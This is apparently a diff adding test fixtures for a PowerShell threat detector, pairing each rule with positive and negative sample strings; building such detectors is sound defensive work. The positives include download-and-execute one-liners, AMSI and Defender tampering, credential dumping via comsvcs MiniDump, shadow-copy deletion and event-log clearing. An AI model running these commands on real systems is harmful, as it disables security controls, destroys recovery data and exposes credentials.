@@ -1,0 +1,212 @@
+[
+  {
+    "Rule": "Backtick in a member name",
+    "Positive": "(New-Object Net.WebClient).\"Do`wnloadString\"('http://x')",
+    "Negative": "$x.Length; $y.\"Name With Space\""
+  },
+  {
+    "Rule": "Backtick in a variable name",
+    "Positive": "Write-Output ${e`Nv:c`oM`sPEC}",
+    "Negative": "Write-Output ${env:ComSpec}; $a = \"x`ty\""
+  },
+  {
+    "Rule": "Backtick in a command name",
+    "Positive": "i`e`x 'Write-Output 1'",
+    "Negative": "Get-ChildItem `\r\n    -Path ."
+  },
+  {
+    "Rule": "Variable name made of symbols",
+    "Positive": "${____/=/==//===} = 1",
+    "Negative": "$_; $__x = 1; ${my-var} = 2"
+  },
+  {
+    "Rule": "Reordered format string",
+    "Positive": ".(\"{1}{0}\" -f 'ex','I') 1",
+    "Negative": "\"{0}{1}\" -f 'a', 'b'; \"{0} {1}\" -f 1, 2"
+  },
+  {
+    "Rule": "Computed command name",
+    "Positive": "& (\"i\" + \"ex\") 'Write-Output 1'",
+    "Negative": "& $command; & ($module) { 1 }; . (Join-Path $PSScriptRoot 'x.ps1')"
+  },
+  {
+    "Rule": "Characters picked from well-known variables",
+    "Positive": "& ($ShellId[1] + $ShellId[13] + 'x') 1",
+    "Negative": "$env:Path[0]; $list[1]"
+  },
+  {
+    "Rule": "Code run through ExecutionContext",
+    "Positive": "$ExecutionContext.InvokeCommand.InvokeScript('Write-Output 1')",
+    "Negative": "$ExecutionContext.SessionState.Path"
+  },
+  {
+    "Rule": "Computed member name",
+    "Positive": "$o.('Na' + 'me')",
+    "Negative": "$o.Name"
+  },
+  {
+    "Rule": "Many char casts",
+    "Positive": "[char]65 + [char]66 + [char]67 + [char]68 + [char]69 + [char]70 + [char]71 + [char]72 + [char]73 + [char]74",
+    "Negative": "[char]65 + [char]66 + [char]67 + [char]68 + [char]69 + [char]70 + [char]71 + [char]72 + [char]73"
+  },
+  {
+    "Rule": "Many bitwise xor",
+    "Positive": "(1 -bxor 0x41), (2 -bxor 0x41), (3 -bxor 0x41), (4 -bxor 0x41), (5 -bxor 0x41)",
+    "Negative": "(1 -bxor 0x41), (2 -bxor 0x41), (3 -bxor 0x41), (4 -bxor 0x41)"
+  },
+  {
+    "Rule": "Many quoted member names",
+    "Positive": "$o.'p1'; $o.'p2'; $o.'p3'; $o.'p4'; $o.'p5'; $o.'p6'; $o.'p7'; $o.'p8'; $o.'p9'; $o.'p10'; $o.'p11'; $o.'p12'; $o.'p13'; $o.'p14'; $o.'p15'; $o.'p16'; $o.'p17'; $o.'p18'; $o.'p19'; $o.'p20'",
+    "Negative": "$o.'p1'; $o.'p2'; $o.'p3'; $o.'p4'; $o.'p5'; $o.'p6'; $o.'p7'; $o.'p8'; $o.'p9'; $o.'p10'; $o.'p11'; $o.'p12'; $o.'p13'; $o.'p14'; $o.'p15'; $o.'p16'; $o.'p17'; $o.'p18'; $o.'p19'"
+  },
+  {
+    "Rule": "Encoded command",
+    "Positive": "powershell.exe -NoP -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
+    "Negative": "powershell.exe -NoProfile -Command Get-Date"
+  },
+  {
+    "Rule": "Hidden or policy-bypassing PowerShell",
+    "Positive": "powershell -w hidden -c Get-Date",
+    "Negative": "powershell -NoProfile -Command Get-Date; Start-Process notepad -WindowStyle Hidden"
+  },
+  {
+    "Rule": "Hidden or policy-bypassing PowerShell",
+    "Positive": "powershell -ep bypass -File a.ps1",
+    "Negative": "powershell -ep RemoteSigned -File a.ps1"
+  },
+  {
+    "Rule": "AMSI tampering",
+    "Positive": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+    "Negative": "Write-Output 'AMSI is enabled'"
+  },
+  {
+    "Rule": "Defender tampering",
+    "Positive": "Set-MpPreference -DisableRealtimeMonitoring $true",
+    "Negative": "Set-MpPreference -SignatureUpdateInterval 1; Get-MpPreference"
+  },
+  {
+    "Rule": "Download method",
+    "Positive": "(New-Object Net.WebClient).DownloadFile('http://x', 'f')",
+    "Negative": "[IO.File]::OpenRead('f')"
+  },
+  {
+    "Rule": "Downloaded code run",
+    "Positive": "iwr 'http://x/a.ps1' | iex",
+    "Negative": "Invoke-WebRequest 'http://x' -OutFile a.zip\r\nInvoke-Expression 'Get-Date'"
+  },
+  {
+    "Rule": "Invoke-Expression call",
+    "Positive": "$code = Get-Content .\\a.ps1 -Raw\r\nInvoke-Expression $code",
+    "Negative": "Invoke-Command -ScriptBlock { Get-Date }; $text = 'Invoke-Expression is risky'"
+  },
+  {
+    "Rule": "Memory injection API",
+    "Positive": "$name = 'VirtualAlloc'",
+    "Negative": "$text = 'VirtualAllocation is a word'"
+  },
+  {
+    "Rule": "Memory injection API call",
+    "Positive": "[Win32]::VirtualProtect($a, 1, 0x40, [ref] 0)",
+    "Negative": "[Win32]::GetTickCount()"
+  },
+  {
+    "Rule": "Credential dumping",
+    "Positive": "$c = 'sekurlsa::logonpasswords'",
+    "Negative": "$c = 'the lsadump tool'"
+  },
+  {
+    "Rule": "Credential dumping command",
+    "Positive": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full",
+    "Negative": "rundll32.exe shell32.dll,Control_RunDLL"
+  },
+  {
+    "Rule": "Recovery inhibited",
+    "Positive": "vssadmin delete shadows /all /quiet",
+    "Negative": "vssadmin list shadows"
+  },
+  {
+    "Rule": "Logs or history cleared",
+    "Positive": "wevtutil cl Security",
+    "Negative": "wevtutil qe Security /c:5"
+  },
+  {
+    "Rule": "Scheduled task or service created",
+    "Positive": "schtasks /create /tn x /tr y /sc onlogon",
+    "Negative": "Get-ScheduledTask; schtasks /query"
+  },
+  {
+    "Rule": "Run key written",
+    "Positive": "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name x -Value y",
+    "Negative": "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall'"
+  },
+  {
+    "Rule": "WMI event subscription",
+    "Positive": "Get-WmiObject -Namespace root\\subscription -Class __EventFilter",
+    "Negative": "Get-WmiObject -Class Win32_Service"
+  },
+  {
+    "Rule": "Raw TCP client",
+    "Positive": "New-Object System.Net.Sockets.TCPClient('h', 1)",
+    "Negative": "New-Object System.Net.WebClient"
+  },
+  {
+    "Rule": "Script block built from text",
+    "Positive": "[ScriptBlock]::Create('Write-Output 1')",
+    "Negative": "$sb = { 1 }; & $sb"
+  },
+  {
+    "Rule": "Native API import",
+    "Positive": "Add-Type -TypeDefinition '[DllImport(\"user32.dll\")] public static extern int X();'",
+    "Negative": "Add-Type -TypeDefinition 'public class C { }'"
+  },
+  {
+    "Rule": "PowerShell logging tampering",
+    "Positive": "[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')",
+    "Negative": "$s = 'cachedSettings'"
+  },
+  {
+    "Rule": "Reflective assembly load",
+    "Positive": "[Reflection.Assembly]::Load($bytes)",
+    "Negative": "[Reflection.Assembly]::LoadFile('C:\\Tools\\a.dll'); [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')"
+  },
+  {
+    "Rule": "Execution policy weakened",
+    "Positive": "Set-ExecutionPolicy Bypass -Scope Process -Force",
+    "Negative": "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; Get-ExecutionPolicy"
+  },
+  {
+    "Rule": "PowerShell 2 downgrade",
+    "Positive": "powershell.exe -Version 2 -NoProfile -Command Get-Date",
+    "Negative": "powershell.exe -Version 5.1 -Command Get-Date"
+  },
+  {
+    "Rule": "PowerShell logging policy value",
+    "Positive": "Set-ItemProperty -Path $key -Name EnableScriptBlockLogging -Value 0",
+    "Negative": "$text = 'EnableScriptBlockLoggingHelp'"
+  },
+  {
+    "Rule": "Paste or file-sharing host URL",
+    "Positive": "iwr 'https://pastebin.com/raw/abc' -OutFile a.ps1",
+    "Negative": "iwr 'https://example.com/paste/abc' -OutFile a.ps1"
+  },
+  {
+    "Rule": "GitHub raw or gist URL",
+    "Positive": "iwr 'https://raw.githubusercontent.com/u/r/main/a.ps1' -OutFile a.ps1",
+    "Negative": "Start-Process 'https://github.com/u/r'"
+  },
+  {
+    "Rule": "URL to a bare IP address",
+    "Positive": "iwr 'http://10.1.2.3/a.ps1' -OutFile a.ps1",
+    "Negative": "iwr 'http://127.0.0.1:8080/'; iwr 'http://localhost/'; iwr 'https://example.com/'"
+  },
+  {
+    "Rule": "Hex decoding",
+    "Positive": "[Convert]::ToByte('4A', 16)",
+    "Negative": "[Convert]::ToInt32('101', 2); [Convert]::ToByte('42')"
+  },
+  {
+    "Rule": "Hidden Start-Process",
+    "Positive": "Start-Process notepad -WindowStyle Hidden",
+    "Negative": "Start-Process notepad -WindowStyle Minimized"
+  }
+]
